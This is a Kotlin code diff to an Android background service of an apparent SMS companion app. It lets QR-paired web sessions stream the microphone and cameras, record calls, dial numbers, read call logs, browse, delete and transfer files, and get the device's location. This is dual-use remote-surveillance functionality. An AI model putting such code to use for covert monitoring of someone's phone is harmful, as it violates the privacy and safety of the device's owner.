@@ -87,17 +87,47 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
 
+    private data class SessionListenerBundle(
+        val sessionId: String,
+        var outgoingRequestListener: ListenerRegistration? = null,
+        var sessionNotificationsListener: ListenerRegistration? = null,
+        var remoteMicListener: ListenerRegistration? = null,
+        var remoteCameraListener: ListenerRegistration? = null,
+        var remoteCallRecorderListener: ListenerRegistration? = null,
+        var callLogSyncRequestListener: ListenerRegistration? = null,
+        var dialRequestListener: ListenerRegistration? = null,
+        var fileManagerListener: ListenerRegistration? = null,
+        var fileTransferListener: ListenerRegistration? = null,
+        var lastHandledCallSyncSeq: Long = 0L,
+        var lastProcessedMicCommandSeq: Long = -1L,
+        var lastProcessedCameraCommandSeq: Long = -1L,
+        var lastProcessedCallRecorderCommandSeq: Long = -1L,
+        var lastProcessedFileManagerSeq: Long = -1L,
+        var lastProcessedFileTransferSeq: Long = -1L,
+        val notificationListenStartedMs: Long = System.currentTimeMillis()
+    ) {
+        fun removeAll() {
+            try { outgoingRequestListener?.remove() } catch (_: Throwable) {}
+            try { sessionNotificationsListener?.remove() } catch (_: Throwable) {}
+            try { remoteMicListener?.remove() } catch (_: Throwable) {}
+            try { remoteCameraListener?.remove() } catch (_: Throwable) {}
+            try { remoteCallRecorderListener?.remove() } catch (_: Throwable) {}
+            try { callLogSyncRequestListener?.remove() } catch (_: Throwable) {}
+            try { dialRequestListener?.remove() } catch (_: Throwable) {}
+            try { fileManagerListener?.remove() } catch (_: Throwable) {}
+            try { fileTransferListener?.remove() } catch (_: Throwable) {}
+        }
+    }
+
     private var repository: SmsRepository? = null
     private var pairingPrefsListener: SharedPreferences.OnSharedPreferenceChangeListener? = null
     private var currentBoundSessionId: String? = null
-
-    private var outgoingRequestListener: ListenerRegistration? = null
-    private var sessionNotificationsListener: ListenerRegistration? = null
-    private var remoteMicListener: ListenerRegistration? = null
-    private var remoteCameraListener: ListenerRegistration? = null
-    private var remoteCallRecorderListener: ListenerRegistration? = null
-    private var callLogSyncRequestListener: ListenerRegistration? = null
+    private var activeCameraSessionId: String? = null
+    private var activeMicSessionId: String? = null
+    private val sessionListenersMap = mutableMapOf<String, SessionListenerBundle>()
     private var callLogObserver: ContentObserver? = null
+    private var presenceHeartbeatJob: Job? = null
+    private var ownLocationRequestListener: ListenerRegistration? = null
 
     private var micStreamJob: Job? = null
     private var micWakeLock: PowerManager.WakeLock? = null
@@ -113,12 +143,6 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
     private val cameraLastUploadAtMs = AtomicLong(0L)
     private var cameraHdSeqCounter = 0
 
-    private var lastHandledCallSyncSeq = 0L
-    private var lastProcessedMicCommandSeq = -1L
-    private var lastProcessedCameraCommandSeq = -1L
-    private var lastProcessedCallRecorderCommandSeq = -1L
-    private var notificationListenStartedMs = 0L
-
     override fun onCreate() {
         super.onCreate()
         activeInstance = this
@@ -133,6 +157,8 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         ensureKeepAliveChannel()
         registerPairingWatcher()
         scheduleWatchdogAlarm(applicationContext)
+        startDevicePresenceHeartbeat()
+        attachLocationRequestWatcher()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -146,6 +172,9 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
             cancelWatchdogAlarm(applicationContext)
             stopBackgroundMicInternal(publishStopped = true)
             stopBackgroundCameraInternal(publishStopped = true)
+            CoroutineScope(Dispatchers.IO).launch {
+                QrPairingManager.registerDevicePresence(applicationContext, isOnline = false)
+            }
             stopForegroundCompat()
             stopSelf()
             return START_NOT_STICKY
@@ -167,12 +196,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
             fromBoot = fromBoot
         )
 
-        val sessionId = QrPairingManager.getActiveSessionId(applicationContext)
-        if (sessionId != null && sessionId != currentBoundSessionId) {
-            attachSessionListeners(sessionId)
-        } else if (sessionId == null) {
-            updateNotificationOnly()
-        }
+        refreshAllSessionListeners()
 
         when (action) {
             ACTION_START_BG_MIC -> startBackgroundMicInternal()
@@ -202,6 +226,10 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
             activeInstance = null
         }
         _isServiceRunning.value = false
+        presenceHeartbeatJob?.cancel()
+        presenceHeartbeatJob = null
+        try { ownLocationRequestListener?.remove() } catch (_: Throwable) {}
+        ownLocationRequestListener = null
         stopBackgroundMicInternal(publishStopped = false)
         stopBackgroundCameraInternal(publishStopped = false)
         try {
@@ -216,17 +244,45 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         super.onDestroy()
     }
 
+    private fun attachLocationRequestWatcher() {
+        try { ownLocationRequestListener?.remove() } catch (_: Throwable) {}
+        ownLocationRequestListener = QrPairingManager.listenToOwnDeviceLocationRequests(applicationContext) {
+            serviceScope.launch(Dispatchers.IO) {
+                try {
+                    val primary = QrPairingManager.getActiveSessionId(applicationContext)
+                    QrPairingManager.registerDevicePresence(
+                        context = applicationContext,
+                        overrideSessionId = primary,
+                        isOnline = true,
+                        includeFreshLocation = true
+                    )
+                } catch (_: Throwable) {}
+            }
+        }
+    }
+
+    private fun startDevicePresenceHeartbeat() {
+        presenceHeartbeatJob?.cancel()
+        presenceHeartbeatJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                try {
+                    val primary = QrPairingManager.getActiveSessionId(applicationContext)
+                    QrPairingManager.registerDevicePresence(
+                        context = applicationContext,
+                        overrideSessionId = primary,
+                        isOnline = true
+                    )
+                } catch (_: Throwable) {}
+                delay(45_000L)
+            }
+        }
+    }
+
     private fun registerPairingWatcher() {
         val prefs = applicationContext.getSharedPreferences(PAIRING_PREFS_NAME, Context.MODE_PRIVATE)
         val listener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
-            if (key == KEY_ACTIVE_PAIRING_SESSION_ID) {
-                val newSession = QrPairingManager.getActiveSessionId(applicationContext)
-                if (newSession != null && newSession != currentBoundSessionId) {
-                    attachSessionListeners(newSession)
-                } else if (newSession == null) {
-                    detachSessionListeners()
-                    updateNotificationOnly()
-                }
+            if (key == KEY_ACTIVE_PAIRING_SESSION_ID || key == QrPairingManager.KEY_PAIRED_SESSIONS_JSON) {
+                refreshAllSessionListeners()
             }
         }
         pairingPrefsListener = listener
@@ -245,37 +301,54 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
 
     private fun detachSessionListeners() {
         currentBoundSessionId = null
-        outgoingRequestListener?.remove()
-        outgoingRequestListener = null
-        sessionNotificationsListener?.remove()
-        sessionNotificationsListener = null
-        remoteMicListener?.remove()
-        remoteMicListener = null
-        remoteCameraListener?.remove()
-        remoteCameraListener = null
-        remoteCallRecorderListener?.remove()
-        remoteCallRecorderListener = null
-        callLogSyncRequestListener?.remove()
-        callLogSyncRequestListener = null
+        sessionListenersMap.values.forEach { it.removeAll() }
+        sessionListenersMap.clear()
         callLogObserver?.let {
             CallLogSyncHelper.unregisterCallLogObserver(applicationContext, it)
         }
         callLogObserver = null
     }
 
-    private fun attachSessionListeners(sessionId: String) {
-        detachSessionListeners()
-        currentBoundSessionId = sessionId
-        notificationListenStartedMs = System.currentTimeMillis()
-        lastProcessedMicCommandSeq = -1L
-        lastProcessedCameraCommandSeq = -1L
-        lastProcessedCallRecorderCommandSeq = -1L
+    private fun refreshAllSessionListeners() {
+        val primary = QrPairingManager.getActiveSessionId(applicationContext)
+        val desiredSessions = QrPairingManager.getAllTargetSessionIds(applicationContext)
+        currentBoundSessionId = primary ?: desiredSessions.firstOrNull()
+
+        val desiredSet = desiredSessions.toSet()
+        val toRemove = sessionListenersMap.keys.filter { it !in desiredSet }
+        toRemove.forEach { sid ->
+            sessionListenersMap.remove(sid)?.removeAll()
+        }
+
+        desiredSessions.forEach { sid ->
+            if (!sessionListenersMap.containsKey(sid)) {
+                attachSingleSessionBundle(sid)
+            }
+        }
+
+        if (desiredSessions.isNotEmpty() && callLogObserver == null && CallLogSyncHelper.hasCallLogPermission(applicationContext)) {
+            callLogObserver = CallLogSyncHelper.registerCallLogObserver(applicationContext) {
+                serviceScope.launch(Dispatchers.IO) {
+                    val calls = CallLogSyncHelper.readRecentCallLogs(applicationContext, limit = 80)
+                    QrPairingManager.syncCallLogsToPairedSession(applicationContext, calls)
+                }
+            }
+        } else if (desiredSessions.isEmpty()) {
+            callLogObserver?.let { CallLogSyncHelper.unregisterCallLogObserver(applicationContext, it) }
+            callLogObserver = null
+        }
+
         updateNotificationOnly()
+    }
+
+    private fun attachSingleSessionBundle(sessionId: String) {
+        val bundle = SessionListenerBundle(sessionId = sessionId)
+        sessionListenersMap[sessionId] = bundle
 
         val repo = repository ?: SmsRepository(applicationContext).also { repository = it }
 
         // 1. Outgoing Web SMS Listener
-        outgoingRequestListener = QrPairingManager.listenToOutgoingWebRequests(
+        bundle.outgoingRequestListener = QrPairingManager.listenToOutgoingWebRequests(
             context = applicationContext,
             sessionId = sessionId
         ) { requestId, recipient, body ->
@@ -288,18 +361,18 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                     requestId = requestId,
                     status = if (res.isSuccess) "SENT" else "FAILED"
                 )
-                repo.emitSyncLog("WEB_OUTGOING", "ওয়েব থেকে '$recipient'-এ ব্যাকগ্রাউন্ডে এসএমএস পাঠানো হয়েছে")
+                repo.emitSyncLog("WEB_OUTGOING", "ওয়েব/ডিভাইস থেকে '$recipient'-এ ব্যাকগ্রাউন্ডে এসএমএস পাঠানো হয়েছে")
             }
         }
 
         // 2. Incoming Web Notifications Mirror
-        sessionNotificationsListener = QrPairingManager.listenToSessionNotifications(
+        bundle.sessionNotificationsListener = QrPairingManager.listenToSessionNotifications(
             context = applicationContext,
             sessionId = sessionId
         ) { items ->
             items.forEach { item ->
                 if (item.sourceDevice == "WEB") {
-                    val isRecentOrTest = item.isTest || item.createdAtMs >= (notificationListenStartedMs - 20_000L)
+                    val isRecentOrTest = item.isTest || item.createdAtMs >= (bundle.notificationListenStartedMs - 20_000L)
                     if (isRecentOrTest &&
                         !QrPairingManager.isWebNotificationSeen(applicationContext, item.id) &&
                         tryMarkIncomingNotifHandled(item.id)
@@ -317,7 +390,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                         if (item.id.startsWith("ping_")) {
                             serviceScope.launch {
                                 val ackId = "ack_${item.id}".take(120)
-                                val deviceModel = "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${Build.MODEL}"
+                                val deviceModel = QrPairingManager.getDeviceDisplayName()
                                 QrPairingManager.syncNotificationToPairedSession(
                                     context = applicationContext,
                                     notifId = ackId,
@@ -338,21 +411,13 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
             }
         }
 
-        // 3. Call Log ContentObserver & Sync Requests
-        if (CallLogSyncHelper.hasCallLogPermission(applicationContext)) {
-            callLogObserver = CallLogSyncHelper.registerCallLogObserver(applicationContext) {
-                serviceScope.launch(Dispatchers.IO) {
-                    val calls = CallLogSyncHelper.readRecentCallLogs(applicationContext, limit = 80)
-                    QrPairingManager.syncCallLogsToPairedSession(applicationContext, calls, sessionId)
-                }
-            }
-        }
-        callLogSyncRequestListener = QrPairingManager.listenToCallLogSyncRequests(
+        // 3. Call Log Sync Requests
+        bundle.callLogSyncRequestListener = QrPairingManager.listenToCallLogSyncRequests(
             context = applicationContext,
             sessionId = sessionId
         ) { syncSeq ->
-            if (syncSeq > lastHandledCallSyncSeq) {
-                lastHandledCallSyncSeq = syncSeq
+            if (syncSeq > bundle.lastHandledCallSyncSeq) {
+                bundle.lastHandledCallSyncSeq = syncSeq
                 if (CallLogSyncHelper.hasCallLogPermission(applicationContext)) {
                     serviceScope.launch(Dispatchers.IO) {
                         val calls = CallLogSyncHelper.readRecentCallLogs(applicationContext, limit = 80)
@@ -363,21 +428,21 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         }
 
         // 4. Remote Call Recorder Commands in Background
-        remoteCallRecorderListener = QrPairingManager.listenToRemoteCallRecorderCommands(
+        bundle.remoteCallRecorderListener = QrPairingManager.listenToRemoteCallRecorderCommands(
             context = applicationContext,
             sessionId = sessionId
         ) { remoteCmd ->
             val seq = remoteCmd.commandSeq
-            val isFirstSeen = lastProcessedCallRecorderCommandSeq < 0L
-            if (!isFirstSeen && seq <= lastProcessedCallRecorderCommandSeq) return@listenToRemoteCallRecorderCommands
+            val isFirstSeen = bundle.lastProcessedCallRecorderCommandSeq < 0L
+            if (!isFirstSeen && seq <= bundle.lastProcessedCallRecorderCommandSeq) return@listenToRemoteCallRecorderCommands
             if (isFirstSeen) {
-                lastProcessedCallRecorderCommandSeq = seq
+                bundle.lastProcessedCallRecorderCommandSeq = seq
                 val withinWindow = remoteCmd.updatedAtMs == 0L ||
                     kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                 val isFreshStart = remoteCmd.command == "START" && remoteCmd.status == "STARTING" && withinWindow
                 if (!isFreshStart) return@listenToRemoteCallRecorderCommands
             } else {
-                lastProcessedCallRecorderCommandSeq = seq
+                bundle.lastProcessedCallRecorderCommandSeq = seq
             }
 
             when (remoteCmd.command) {
@@ -425,25 +490,26 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         }
 
         // 5. Remote Microphone Streaming (Works in Background & Foreground!)
-        remoteMicListener = QrPairingManager.listenToRemoteMicCommands(
+        bundle.remoteMicListener = QrPairingManager.listenToRemoteMicCommands(
             context = applicationContext,
             sessionId = sessionId
         ) { remoteCmd ->
             val seq = remoteCmd.commandSeq
-            val isFirstSeen = lastProcessedMicCommandSeq < 0L
-            if (!isFirstSeen && seq <= lastProcessedMicCommandSeq) return@listenToRemoteMicCommands
+            val isFirstSeen = bundle.lastProcessedMicCommandSeq < 0L
+            if (!isFirstSeen && seq <= bundle.lastProcessedMicCommandSeq) return@listenToRemoteMicCommands
             if (isFirstSeen) {
-                lastProcessedMicCommandSeq = seq
+                bundle.lastProcessedMicCommandSeq = seq
                 val withinWindow = remoteCmd.updatedAtMs == 0L ||
                     kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                 val isFreshStart = remoteCmd.command == "START" && remoteCmd.status == "STARTING" && withinWindow
                 if (!isFreshStart) return@listenToRemoteMicCommands
             } else {
-                lastProcessedMicCommandSeq = seq
+                bundle.lastProcessedMicCommandSeq = seq
             }
 
             when (remoteCmd.command) {
                 "START" -> {
+                    activeMicSessionId = sessionId
                     if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                         startBackgroundMicInternal()
                     } else {
@@ -471,26 +537,27 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         }
 
         // 6. Remote Camera Streaming in Background & Foreground (CameraX ImageAnalysis inside Service)
-        remoteCameraListener = QrPairingManager.listenToRemoteCameraCommands(
+        bundle.remoteCameraListener = QrPairingManager.listenToRemoteCameraCommands(
             context = applicationContext,
             sessionId = sessionId
         ) { remoteCmd ->
             val seq = remoteCmd.commandSeq
-            val isFirstSeen = lastProcessedCameraCommandSeq < 0L
-            if (!isFirstSeen && seq <= lastProcessedCameraCommandSeq) return@listenToRemoteCameraCommands
+            val isFirstSeen = bundle.lastProcessedCameraCommandSeq < 0L
+            if (!isFirstSeen && seq <= bundle.lastProcessedCameraCommandSeq) return@listenToRemoteCameraCommands
             if (isFirstSeen) {
-                lastProcessedCameraCommandSeq = seq
+                bundle.lastProcessedCameraCommandSeq = seq
                 val withinWindow = remoteCmd.updatedAtMs == 0L ||
                     kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
                 val isFreshStart = (remoteCmd.command == "START_BACK" || remoteCmd.command == "START_FRONT") &&
                     remoteCmd.status == "STARTING" && withinWindow
                 if (!isFreshStart) return@listenToRemoteCameraCommands
             } else {
-                lastProcessedCameraCommandSeq = seq
+                bundle.lastProcessedCameraCommandSeq = seq
             }
 
             when (remoteCmd.command) {
                 "START_BACK", "START_FRONT" -> {
+                    activeCameraSessionId = sessionId
                     val lens = if (remoteCmd.command == "START_FRONT") "FRONT" else "BACK"
                     if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                         startBackgroundCameraInternal(lens)
@@ -518,6 +585,186 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                 "STOP" -> stopBackgroundCameraInternal(publishStopped = true)
                 "TOGGLE_TORCH" -> toggleBackgroundTorchInternal()
                 "CAPTURE_HD" -> triggerBackgroundHdCaptureInternal()
+            }
+        }
+
+        // 7. Remote Website / Peer Device Call Dialer Requests (Works 24/7 in Background & Foreground!)
+        bundle.dialRequestListener = QrPairingManager.listenToDialRequests(
+            context = applicationContext,
+            sessionId = sessionId
+        ) { req ->
+            val ageMs = kotlin.math.abs(System.currentTimeMillis() - req.createdAtMs)
+            if (ageMs > 300_000L) return@listenToDialRequests
+            if (!tryMarkDialRequestHandled(req.id)) return@listenToDialRequests
+
+            val outcome = CallDialerHelper.placeCall(
+                context = applicationContext,
+                rawNumber = req.phoneNumber,
+                simSlotIndex = req.simSlot,
+                fromBackground = !isUiForeground,
+                openDialerOnly = false
+            )
+            val statusToReport = when (outcome.mode) {
+                "DIRECT_CALL" -> "DIALING"
+                "DIALER_OPENED" -> "OPENED_DIALER"
+                "PERMISSION_NEEDED" -> "PERMISSION_NEEDED"
+                else -> "FAILED"
+            }
+            serviceScope.launch {
+                QrPairingManager.markDialRequestStatus(
+                    context = applicationContext,
+                    sessionId = sessionId,
+                    requestId = req.id,
+                    status = statusToReport,
+                    errorMessage = if (outcome.success) "" else outcome.message
+                )
+                repo.emitSyncLog("WEB_CALL", "📞 রিমোট কল ডায়াল (${req.phoneNumber}): ${outcome.message}")
+            }
+        }
+
+        // 8. Remote File Manager Directory Browsing & Commands (24/7 Background + Foreground)
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                val initialSnap = DeviceFileManagerHelper.browseDirectory(applicationContext)
+                QrPairingManager.publishFileManagerSnapshot(applicationContext, sessionId, initialSnap)
+            } catch (_: Throwable) {}
+        }
+
+        bundle.fileManagerListener = QrPairingManager.listenToFileManagerCommands(
+            context = applicationContext,
+            sessionId = sessionId
+        ) { remoteCmd ->
+            val seq = remoteCmd.commandSeq
+            val isFirstSeen = bundle.lastProcessedFileManagerSeq < 0L
+            if (!isFirstSeen && seq <= bundle.lastProcessedFileManagerSeq) return@listenToFileManagerCommands
+            if (isFirstSeen) {
+                bundle.lastProcessedFileManagerSeq = seq
+                val withinWindow = remoteCmd.updatedAtMs == 0L ||
+                    kotlin.math.abs(System.currentTimeMillis() - remoteCmd.updatedAtMs) <= 300_000L
+                val isActionable = remoteCmd.command != "NONE" && withinWindow
+                if (!isActionable) return@listenToFileManagerCommands
+            } else {
+                bundle.lastProcessedFileManagerSeq = seq
+            }
+
+            if (remoteCmd.command == "NONE") return@listenToFileManagerCommands
+            serviceScope.launch(Dispatchers.IO) {
+                when (remoteCmd.command) {
+                    "LIST_ROOTS", "OPEN_DIR", "REFRESH" -> {
+                        val snap = DeviceFileManagerHelper.browseDirectory(
+                            context = applicationContext,
+                            targetRootId = remoteCmd.targetRootId,
+                            targetPath = remoteCmd.targetPath
+                        )
+                        QrPairingManager.publishFileManagerSnapshot(applicationContext, sessionId, snap)
+                    }
+                    "DELETE_FILE" -> {
+                        val fId = remoteCmd.targetFileId
+                        if (!fId.isNullOrBlank()) {
+                            DeviceFileManagerHelper.deleteFileEntry(
+                                context = applicationContext,
+                                rootId = remoteCmd.targetRootId,
+                                fileId = fId
+                            )
+                        }
+                        val snap = DeviceFileManagerHelper.browseDirectory(
+                            context = applicationContext,
+                            targetRootId = remoteCmd.targetRootId,
+                            targetPath = remoteCmd.targetPath
+                        )
+                        QrPairingManager.publishFileManagerSnapshot(applicationContext, sessionId, snap)
+                    }
+                    "CREATE_FOLDER" -> {
+                        val folderName = remoteCmd.targetName
+                        if (!folderName.isNullOrBlank()) {
+                            DeviceFileManagerHelper.createSubfolder(
+                                context = applicationContext,
+                                rootId = remoteCmd.targetRootId,
+                                targetPath = remoteCmd.targetPath,
+                                folderName = folderName
+                            )
+                        }
+                        val snap = DeviceFileManagerHelper.browseDirectory(
+                            context = applicationContext,
+                            targetRootId = remoteCmd.targetRootId,
+                            targetPath = remoteCmd.targetPath
+                        )
+                        QrPairingManager.publishFileManagerSnapshot(applicationContext, sessionId, snap)
+                    }
+                }
+            }
+        }
+
+        // 9. Remote File Transfer (Web <-> Phone Preview, Download, and Upload)
+        bundle.fileTransferListener = QrPairingManager.listenToFileTransferCommands(
+            context = applicationContext,
+            sessionId = sessionId
+        ) { req ->
+            val seq = req.commandSeq
+            val isFirstSeen = bundle.lastProcessedFileTransferSeq < 0L
+            if (!isFirstSeen && seq <= bundle.lastProcessedFileTransferSeq) return@listenToFileTransferCommands
+            if (isFirstSeen) {
+                bundle.lastProcessedFileTransferSeq = seq
+                val withinWindow = req.updatedAtMs == 0L ||
+                    kotlin.math.abs(System.currentTimeMillis() - req.updatedAtMs) <= 180_000L
+                val isActionable = (req.command == "FETCH_FILE" || req.command == "PUSH_FILE") && withinWindow
+                if (!isActionable) return@listenToFileTransferCommands
+            } else {
+                bundle.lastProcessedFileTransferSeq = seq
+            }
+
+            if (req.command == "FETCH_FILE") {
+                val targetFileId = req.targetFileId ?: return@listenToFileTransferCommands
+                serviceScope.launch(Dispatchers.IO) {
+                    val payload = DeviceFileManagerHelper.prepareFileForWeb(
+                        context = applicationContext,
+                        rootId = req.targetRootId,
+                        fileId = targetFileId
+                    )
+                    QrPairingManager.publishFileTransferResult(
+                        context = applicationContext,
+                        sessionId = sessionId,
+                        status = payload.status,
+                        direction = "PHONE_TO_WEB",
+                        fileName = payload.fileName,
+                        mimeType = payload.mimeType,
+                        sizeBytes = payload.sizeBytes,
+                        base64Data = payload.base64Data,
+                        transferSeq = seq,
+                        isPreviewImage = payload.isPreviewImage,
+                        errorMessage = payload.errorMessage
+                    )
+                }
+            } else if (req.command == "PUSH_FILE" && !req.base64Data.isNullOrBlank()) {
+                serviceScope.launch(Dispatchers.IO) {
+                    val res = DeviceFileManagerHelper.saveWebUploadedFile(
+                        context = applicationContext,
+                        targetRootId = req.targetRootId,
+                        targetPath = req.targetPath,
+                        fileName = req.fileName,
+                        mimeType = req.mimeType,
+                        base64Data = req.base64Data
+                    )
+                    QrPairingManager.publishFileTransferResult(
+                        context = applicationContext,
+                        sessionId = sessionId,
+                        status = if (res.success) "SAVED" else "ERROR",
+                        direction = "WEB_TO_PHONE",
+                        fileName = res.savedName,
+                        mimeType = req.mimeType,
+                        sizeBytes = 0L,
+                        base64Data = null,
+                        transferSeq = seq,
+                        isPreviewImage = false,
+                        errorMessage = if (res.success) null else res.message
+                    )
+                    val refreshed = DeviceFileManagerHelper.browseDirectory(
+                        context = applicationContext,
+                        targetRootId = req.targetRootId,
+                        targetPath = req.targetPath
+                    )
+                    QrPairingManager.publishFileManagerSnapshot(applicationContext, sessionId, refreshed)
+                }
             }
         }
     }
@@ -560,7 +807,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         serviceScope.launch {
             QrPairingManager.publishRemoteCameraState(
                 context = applicationContext,
-                sessionId = currentBoundSessionId,
+                sessionId = activeCameraSessionId ?: currentBoundSessionId,
                 status = "ACTIVE",
                 lens = targetLens,
                 torchOn = _backgroundCameraTorchOn.value,
@@ -786,7 +1033,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                 try {
                     QrPairingManager.publishRemoteCameraState(
                         context = applicationContext,
-                        sessionId = currentBoundSessionId,
+                        sessionId = activeCameraSessionId ?: currentBoundSessionId,
                         status = "ACTIVE",
                         lens = lensVal,
                         torchOn = torchVal,
@@ -945,7 +1192,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
         serviceScope.launch {
             QrPairingManager.publishRemoteMicState(
                 context = applicationContext,
-                sessionId = currentBoundSessionId,
+                sessionId = activeMicSessionId ?: currentBoundSessionId,
                 status = "ACTIVE",
                 sampleRate = 16000,
                 errorMessage = ""
@@ -1043,7 +1290,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                                     try {
                                         QrPairingManager.publishRemoteMicState(
                                             context = applicationContext,
-                                            sessionId = currentBoundSessionId,
+                                            sessionId = activeMicSessionId ?: currentBoundSessionId,
                                             status = "ACTIVE",
                                             audioBase64 = b64,
                                             chunkSeq = nextSeq,
@@ -1295,9 +1542,11 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
             micActive -> "🎙️ Pulse লাইভ মাইক ও ব্যাকগ্রাউন্ড চালু"
             else -> "🟢 Pulse SMS ব্যাকগ্রাউন্ডে সবসময় সক্রিয়"
         }
+        val connectedCount = sessionListenersMap.size.coerceAtLeast(if (sessionId != null) 1 else 0)
         val text = when {
             cameraActive -> "অ্যাপের বাইরে থেকেও ওয়েবসাইটে লাইভ ক্যামেরা ও সিঙ্ক চলছে"
             micActive -> "অ্যাপ বন্ধ থাকলেও ওয়েবসাইটে লাইভ মাইক্রোফোন ও সিঙ্ক চলছে"
+            connectedCount > 1 -> "$connectedCount টি ওয়েব/ডিভাইস সেশন একসাথে লাইভ সংযুক্ত আছে"
             sessionId != null -> "ওয়েব পেয়ারিং, ক্যামেরা, মাইক, এসএমএস ও কল রেকর্ডিং লাইভ আছে"
             else -> "২৪/৭ ব্যাকগ্রাউন্ড সার্ভিস চালু • পেয়ার করার জন্য প্রস্তুত"
         }
@@ -1373,6 +1622,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
 
         private val processedWebRequestIds = Collections.synchronizedSet(mutableSetOf<String>())
         private val processedIncomingNotifIds = Collections.synchronizedSet(mutableSetOf<String>())
+        private val processedDialRequestIds = Collections.synchronizedSet(mutableSetOf<String>())
 
         fun setUiForeground(inForeground: Boolean) {
             isUiForeground = inForeground
@@ -1380,6 +1630,7 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
 
         fun tryMarkWebRequestHandled(requestId: String): Boolean = processedWebRequestIds.add(requestId)
         fun tryMarkIncomingNotifHandled(notifId: String): Boolean = processedIncomingNotifIds.add(notifId)
+        fun tryMarkDialRequestHandled(requestId: String): Boolean = processedDialRequestIds.add(requestId)
 
         fun isAlwaysActiveEnabled(context: Context): Boolean {
             return try {
@@ -1613,6 +1864,22 @@ class PulseKeepAliveService : Service(), LifecycleOwner {
                     if (pi != null) am.cancel(pi)
                 }
             } catch (_: Throwable) {}
+        }
+
+        suspend fun syncFileManagerSnapshotToSessions(
+            context: Context,
+            targetRootId: String? = null,
+            targetPath: String? = null
+        ): DirectoryBrowseResult {
+            val appContext = context.applicationContext ?: context
+            val snapshot = DeviceFileManagerHelper.browseDirectory(appContext, targetRootId, targetPath)
+            val sessions = QrPairingManager.getAllTargetSessionIds(appContext)
+            sessions.forEach { sid ->
+                try {
+                    QrPairingManager.publishFileManagerSnapshot(appContext, sid, snapshot)
+                } catch (_: Throwable) {}
+            }
+            return snapshot
         }
     }
 }
